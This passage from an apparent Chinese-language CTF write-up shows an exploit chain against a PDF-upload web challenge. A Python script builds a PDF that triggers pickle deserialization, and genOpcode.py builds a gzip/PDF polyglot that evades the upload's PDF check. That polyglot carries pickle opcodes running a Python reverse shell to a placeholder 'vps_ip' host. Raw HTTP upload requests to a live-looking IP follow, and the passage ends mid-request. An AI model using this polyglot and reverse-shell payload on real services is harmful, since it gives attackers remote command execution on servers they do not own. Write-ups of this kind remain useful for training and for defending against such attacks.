</span><br><span class="line">    )  </span><br><span class="line">    <span class="comment"># Ensure ordering: add page after fonts and content so refs exist  </span></span><br><span class="line">    objects.append(page_dict)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># Start writing file  </span></span><br><span class="line">    w(<span class="string">b&quot;%PDF-1.4\n%\xE2\xE3\xCF\xD3\n&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    offsets: <span class="built_in">dict</span>[<span class="built_in">int</span>, <span class="built_in">int</span>] = &#123;&#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># Write each object, record offsets  </span></span><br><span class="line">    <span class="keyword">for</span> obj_id, obj_body <span class="keyword">in</span> objects:  </span><br><span class="line">        offsets[obj_id] = w(<span class="string">f&quot;<span class="subst">&#123;obj_id&#125;</span> 0 obj\n&quot;</span>.encode(<span class="string">&quot;ascii&quot;</span>))  </span><br><span class="line">        w(obj_body)  </span><br><span class="line">        w(<span class="string">b&quot;\nendobj\n&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># xref  </span></span><br><span class="line">    startxref = bio.tell()  </span><br><span class="line">    max_obj = <span class="built_in">max</span>(offsets) <span class="keyword">if</span> offsets <span class="keyword">else</span> <span class="number">0</span>  </span><br><span class="line">    <span class="comment"># xref table requires a free entry 0  </span></span><br><span class="line">    w(<span class="string">b&quot;xref\n&quot;</span>)  </span><br><span class="line">    w(<span class="string">f&quot;0 <span class="subst">&#123;max_obj + <span class="number">1</span>&#125;</span>\n&quot;</span>.encode(<span class="string">&quot;ascii&quot;</span>))  </span><br><span class="line">    <span class="comment"># object 0 free  </span></span><br><span class="line">    w(<span class="string">b&quot;0000000000 65535 f \n&quot;</span>)  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_obj + <span class="number">1</span>):  </span><br><span class="line">        off = offsets.get(i, <span class="number">0</span>)  </span><br><span class="line">        w(<span class="string">f&quot;<span class="subst">&#123;off:<span class="number">0</span>10d&#125;</span> 00000 n \n&quot;</span>.encode(<span class="string">&quot;ascii&quot;</span>))  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># trailer  </span></span><br><span class="line">    w(  </span><br><span class="line">        (  </span><br><span class="line">            <span class="string">b&quot;trailer\n&quot;</span>  </span><br><span class="line">            + <span class="string">b&quot;&lt;&lt; &quot;</span>  </span><br><span class="line">            + <span class="string">f&quot;/Size <span class="subst">&#123;max_obj + <span class="number">1</span>&#125;</span> &quot;</span>.encode(<span class="string">&quot;ascii&quot;</span>)  </span><br><span class="line">            + <span class="string">b&quot;/Root 1 0 R &quot;</span>  </span><br><span class="line">            + <span class="string">b&quot;&gt;&gt;\n&quot;</span>  </span><br><span class="line">        )  </span><br><span class="line">    )  </span><br><span class="line">    w(<span class="string">b&quot;startxref\n&quot;</span>)  </span><br><span class="line">    w(<span class="string">f&quot;<span class="subst">&#123;startxref&#125;</span>\n&quot;</span>.encode(<span class="string">&quot;ascii&quot;</span>))  </span><br><span class="line">    w(<span class="string">b&quot;%%EOF\n&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> bio.getvalue()  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>() -&gt; <span class="built_in">str</span>:  </span><br><span class="line">    out_dir = os.path.join(os.path.dirname(__file__), os.pardir, <span class="string">&quot;samples&quot;</span>)  </span><br><span class="line">    out_dir = os.path.abspath(out_dir)  </span><br><span class="line">    os.makedirs(out_dir, exist_ok=<span class="literal">True</span>)  </span><br><span class="line">    out_path = os.path.join(out_dir, <span class="string">&quot;debug_ops.pdf&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    data = build_pdf_bytes()  </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(out_path, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">        f.write(data)  </span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;PDF written:&quot;</span>, out_path)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Size:&quot;</span>, <span class="built_in">len</span>(data), <span class="string">&quot;bytes&quot;</span>)  </span><br><span class="line">    <span class="keyword">return</span> out_path  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:  </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>这个脚本会生成一个pdf文件, 对他进行extract_pages时, 会触发<code>pickle.loads</code>, 去加载<code>/app/uploads/n4c1.pickle.gz</code></p><p>有了这个加载gzip压缩后opcode的pdf, 我们还需要上传一个gzip 的 opcode,<br>但是题目有对pdf的检测, 直接上传一个gzip是不行的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:  </span><br><span class="line">    <span class="comment"># just if is a pdf  </span></span><br><span class="line">    parser = PDFParser(io.BytesIO(pdf_content))  </span><br><span class="line">    doc = PDFDocument(parser)  </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(e), <span class="number">500</span></span><br></pre></td></tr></table></figure><p>这一步直接拷打ai迭代出来<br>genOpcode.py:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><span class="line">```python</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_minimal_pdf</span>(<span class="params">base_offset: <span class="built_in">int</span> = <span class="number">0</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Build a minimal valid PDF with absolute xref offsets accounting for base_offset</span></span><br><span class="line"></span><br><span class="line">    header = <span class="string">b&quot;%PDF-1.4\n%\xE2\xE3\xCF\xD3\n&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    obj1 = <span class="string">b&quot;&quot;&quot;1 0 obj</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;&lt; /Type /Catalog /Pages 2 0 R &gt;&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">endobj</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.replace(<span class="string">b&quot;\r&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    obj2 = <span class="string">b&quot;&quot;&quot;2 0 obj</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;&lt; /Type /Pages /Kids [3 0 R] /Count 1 &gt;&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">endobj</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.replace(<span class="string">b&quot;\r&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    obj3 = <span class="string">b&quot;&quot;&quot;3 0 obj</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;&lt; /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R &gt;&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">endobj</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.replace(<span class="string">b&quot;\r&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    stream_body = <span class="string">b&quot;Hello WMCTF!&quot;</span>  <span class="comment"># small visible text</span></span><br><span class="line"></span><br><span class="line">    obj4 = (<span class="string">b&quot;4 0 obj\n&lt;&lt; /Length %d &gt;&gt;\nstream\n&quot;</span> % <span class="built_in">len</span>(stream_body)) + stream_body + <span class="string">b&quot;\nendstream\nendobj\n&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># Build PDF body and record absolute offsets</span></span><br><span class="line"></span><br><span class="line">    pdf = header</span><br><span class="line"></span><br><span class="line">    abs_offsets = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> obj <span class="keyword">in</span> (obj1, obj2, obj3, obj4):</span><br><span class="line"></span><br><span class="line">        abs_offsets.append(base_offset + <span class="built_in">len</span>(pdf))</span><br><span class="line"></span><br><span class="line">        pdf += obj</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># xref and trailer with absolute positions</span></span><br><span class="line"></span><br><span class="line">    xref_abs_offset = base_offset + <span class="built_in">len</span>(pdf)</span><br><span class="line"></span><br><span class="line">    xref_lines = [<span class="string">&quot;xref&quot;</span>, <span class="string">&quot;0 5&quot;</span>, <span class="string">&quot;0000000000 65535 f &quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> off <span class="keyword">in</span> abs_offsets:</span><br><span class="line"></span><br><span class="line">        xref_lines.append(<span class="string">f&quot;<span class="subst">&#123;off:<span class="number">0</span>10d&#125;</span> 00000 n &quot;</span>)</span><br><span class="line"></span><br><span class="line">    xref = (<span class="string">&quot;\n&quot;</span>.join(xref_lines) + <span class="string">&quot;\n&quot;</span>).encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    trailer = (<span class="string">&quot;trailer\n&lt;&lt; /Size 5 /Root 1 0 R &gt;&gt;\nstartxref\n&quot;</span> + <span class="built_in">str</span>(xref_abs_offset) + <span class="string">&quot;\n%%EOF\n&quot;</span>).encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pdf + xref + trailer</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_gzip_with_extra</span>(<span class="params">extra_bytes: <span class="built_in">bytes</span>, payload_bytes: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># GZIP header with FEXTRA holding extra_bytes (uncompressed), then deflate-compressed payload, then CRC/ISIZE</span></span><br><span class="line"></span><br><span class="line">    ID1, ID2, CM = <span class="number">0x1F</span>, <span class="number">0x8B</span>, <span class="number">0x08</span></span><br><span class="line"></span><br><span class="line">    FLG = <span class="number">0x04</span>  <span class="comment"># FEXTRA</span></span><br><span class="line"></span><br><span class="line">    MTIME = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    XFL = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    OS = <span class="number">255</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(extra_bytes) &gt; <span class="number">0xFFFF</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;extra_bytes too long for GZIP FEXTRA (max 65535)&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    header = <span class="built_in">bytes</span>([ID1, ID2, CM, FLG])</span><br><span class="line"></span><br><span class="line">    header += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, MTIME)</span><br><span class="line"></span><br><span class="line">    header += <span class="built_in">bytes</span>([XFL, OS])</span><br><span class="line"></span><br><span class="line">    header += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="built_in">len</span>(extra_bytes))</span><br><span class="line"></span><br><span class="line">    header += extra_bytes</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># raw deflate for payload</span></span><br><span class="line"></span><br><span class="line">    comp = zlib.compressobj(level=<span class="number">9</span>, wbits=-<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">    comp_data = comp.compress(payload_bytes) + comp.flush()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    crc = zlib.crc32(payload_bytes) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    isize = <span class="built_in">len</span>(payload_bytes) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    trailer = struct.pack(<span class="string">&#x27;&lt;II&#x27;</span>, crc, isize)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> header + comp_data + trailer</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># When storing PDF in GZIP FEXTRA, the PDF starts at byte offset 12 from file start</span></span><br><span class="line"></span><br><span class="line">    base_offset = <span class="number">12</span>  <span class="comment"># 10-byte gzip fixed header + 2-byte XLEN</span></span><br><span class="line"></span><br><span class="line">    pdf_bytes = build_minimal_pdf(base_offset=base_offset)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># payload to be recovered after decompression</span></span><br><span class="line"></span><br><span class="line">    opcode_bytes = <span class="string">b&#x27;&#x27;&#x27;(S&#x27;python -c \&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;vps_ip&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)\&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    gz_polyglot = build_gzip_with_extra(extra_bytes=pdf_bytes, payload_bytes=opcode_bytes)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;opcode.gz&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">        f.write(gz_polyglot)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># Diagnostics</span></span><br><span class="line"></span><br><span class="line">    idx = gz_polyglot.find(<span class="string">b&quot;%PDF-&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%PDF- found at offset:&quot;</span>, idx)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Total size:&quot;</span>, <span class="built_in">len</span>(gz_polyglot))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># Quick local checks</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1) Decompress to verify opcode</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> gzip</span><br><span class="line"></span><br><span class="line">        data = gzip.decompress(gz_polyglot)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Decompressed data:&quot;</span>, data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Decompress failed:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2) Basic header preview for PDF</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Header preview around %PDF-:&quot;</span>, gz_polyglot[idx:idx+<span class="number">20</span>] <span class="keyword">if</span> idx != -<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;生成 polyglot: 有效GZIP(可解压得到opcode) + 头部携带有效PDF(可通过PDF解析)&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-ada">Host: <span class="number">49.232</span>.<span class="number">42.74</span>:<span class="number">32532</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada"><span class="keyword">Accept</span>: */*</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada"><span class="keyword">Accept</span>-Encoding: gzip, deflate, br, zstd</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Sec-Fetch-Mode: cors</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Content-<span class="keyword">Type</span>: multipart/form-data; boundary=<span class="comment">----WebKitFormBoundaryS0A1ddjzN4AjJWUx</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada"><span class="keyword">Accept</span>-Language: zh-CN,zh;q=<span class="number">0.9</span>,en;q=<span class="number">0.8</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">sec-ch-ua-mobile: ?<span class="number">0</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">140.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Origin: http://localhost:<span class="number">11451</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Referer: http://localhost:<span class="number">11451</span>/</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Sec-Fetch-Dest: empty</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">sec-ch-ua: <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;140&quot;</span>, <span class="string">&quot;Not=A?Brand&quot;</span>;v=<span class="string">&quot;24&quot;</span>, <span class="string">&quot;Google Chrome&quot;</span>;v=<span class="string">&quot;140&quot;</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Sec-Fetch-Site: same-origin</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">sec-ch-ua-platform: <span class="string">&quot;Windows&quot;</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Content-Length: <span class="number">348</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">  </span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada"><span class="comment">------WebKitFormBoundaryS0A1ddjzN4AjJWUx</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;n4c1.pickle.gz&quot;</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Content-<span class="keyword">Type</span>: application/pdf</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">  </span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">&#123;&#123;file(opcode.gz)&#125;&#125;</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada"><span class="comment">------WebKitFormBoundaryS0A1ddjzN4AjJWUx--</span></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-ada">Host: <span class="number">49.232</span>.<span class="number">42.74</span>:<span class="number">32532</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada"><span class="keyword">Accept</span>: */*</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada"><span class="keyword">Accept</span>-Encoding: gzip, deflate, br, zstd</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Sec-Fetch-Mode: cors</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Content-<span class="keyword">Type</span>: multipart/form-data; boundary=<span class="comment">----WebKitFormBoundaryS0A1ddjzN4AjJWUx</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada"><span class="keyword">Accept</span>-Language: zh-CN,zh;q=<span class="number">0.9</span>,en;q=<span class="number">0.8</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">sec-ch-ua-mobile: ?<span class="number">0</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">140.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Origin: http://localhost:<span class="number">11451</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Referer: http://localhost:<span class="number">11451</span>/</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Sec-Fetch-Dest: empty</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">sec-ch-ua: <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;140&quot;</span>, <span class="string">&quot;Not=A?Brand&quot;</span>;v=<span class="string">&quot;24&quot;</span>, <span class="string">&quot;Google Chrome&quot;</span>;v=<span class="string">&quot;140&quot;</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Sec-Fetch-Site: same-origin</span></span><br><span class="line"><span class="language-ada"></span></span><br><span 